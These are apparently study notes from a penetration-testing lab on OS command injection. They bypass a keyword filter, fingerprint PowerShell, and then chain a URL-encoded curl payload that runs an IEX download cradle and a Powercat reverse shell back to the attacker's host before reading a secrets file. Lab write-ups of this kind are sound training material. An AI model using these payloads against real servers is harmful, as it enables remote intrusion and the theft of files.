- Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system
- Prepared commands provide a set of functions to the underlying system that cannot be changed by user input.

- Sometimes a web application needs to address a multitude of different cases, and a set of predefined functions can be too inflexible.
	- In these cases, web developers often tend to directly accept user input, then sanitize it.
	- This means that user input is filtered for any command sequences that might try to change the application's behavior for malicious purposes.

DON'T FORGET
- Stringing commands together might require a couple of different options
- There's more ways than just **;**
- **&&**, etc


Testing form submissions using Burp will help us to understand how requests are formatted.  Check URL in browser to see where request is sent
![](cmdi_archive.png)
- Here, the cmd is sent via the **Archive** parameter
- Allows us to replace w/ Burp or send our own parameters via **curl**
	- **-X** - Change request type to POST
	- **--data** - Specify the data being sent

```bash
curl -X POST --data 'Archive=ipconfig' http://192.168.193.189:8000/archive
	Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
```
- Sadly this doesn't work.
- Can guess that the filter requires 'git' as part of the parameter

Considering we know that the 'git clone' command will work, we can go from there to see how limited we are
```bash
curl -X POST --data 'Archive=git' http://192.168.193.189:8000/archive
# Successfully shows git help

curl -X POST --data 'Archive=git version' http://192.168.193.189:8000/archive
	Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
# Success

# Attempt to string commands together w/ ;
curl -X POST --data 'Archive=git version%3Bipconfig' http://192.168.193.189:8000/archive 
	An error occured with execution: exit status 1 and git version 2.36.1.windows.1

- Given this is a Windows computer, determine whether thing's are run through PowerShell or CMD
- Use this code snippet to determine
```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
```bash
# URL Encode  (Can use Burp's Decoder tab)
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell

# Send
curl -X POST --data 'Archive=git version%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.193.189:8000/archive
	Repository successfully cloned with command: git version;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell and output: git version 2.36.1.windows.1
	PowerShell
```

- Knowing the webserver's commands will be executed in PowerShell, we can use Powercat to create a reverse shell
```bash
# Copy Powercat to working directory
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

# Serve
python3 -m http.server 80

# Create a nc listener in another tab
nc -nlvp 4444
```

In order to get a reverse shell using Powercat, we'll need to
1. Use a PowerShell download cradle to load the Powercat function contained in the powercat.ps1 script from our web server.
2. Use the _powercat_ function to create the reverse shell with the following parameters:
	- **-c** - Specify where to connect
	- **-p** - Specify the port
	- **-e** - Execute a program.
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.202/powercat.ps1");powercat -c 192.168.45.202 -p 4444 -e powershell
```

```bash
# URL encode it as well
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.202%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.202%20-p%204444%20-e%20powershell' http://192.168.193.189:8000/archive
```

```powershell
# in revshell

type ..\..\Desktop\secrets.txt
```
